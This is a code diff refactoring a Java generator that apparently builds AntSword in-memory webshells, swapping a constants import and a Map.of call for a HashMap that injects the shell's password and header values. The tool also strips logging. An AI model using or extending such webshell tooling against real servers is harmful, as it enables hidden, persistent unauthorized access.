@@ -4,14 +4,14 @@ import com.reajason.javaweb.buddy.LdcReAssignVisitorWrapper;
 import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
 import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
 import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
+import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.config.AntSwordConfig;
-import com.reajason.javaweb.memshell.config.Constants;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.DynamicType;
 import org.apache.commons.lang3.StringUtils;
 
-import java.util.Map;
+import java.util.HashMap;
 
 import static net.bytebuddy.matcher.ElementMatchers.named;
 
@@ -48,13 +48,13 @@ public class AntSwordGenerator {
             builder = LogRemoveMethodVisitor.extend(builder);
         }
 
-        if (shellConfig.getShellType().startsWith(Constants.AGENT)) {
+        if (shellConfig.getShellType().startsWith(ShellType.AGENT)) {
             builder = builder.visit(
-                    new LdcReAssignVisitorWrapper(Map.of(
-                            "pass", antSwordConfig.getPass(),
-                            "headerName", antSwordConfig.getHeaderName(),
-                            "headerValue", antSwordConfig.getHeaderValue()
-                    ))
+                    new LdcReAssignVisitorWrapper(new HashMap<Object, Object>(3) {{
+                        put("pass", antSwordConfig.getPass());
+                        put("headerName", antSwordConfig.getHeaderName());
+                        put("headerValue", antSwordConfig.getHeaderValue());
+                    }})
             );
         } else {
             builder = builder.field(named("pass")).value(antSwordConfig.getPass())
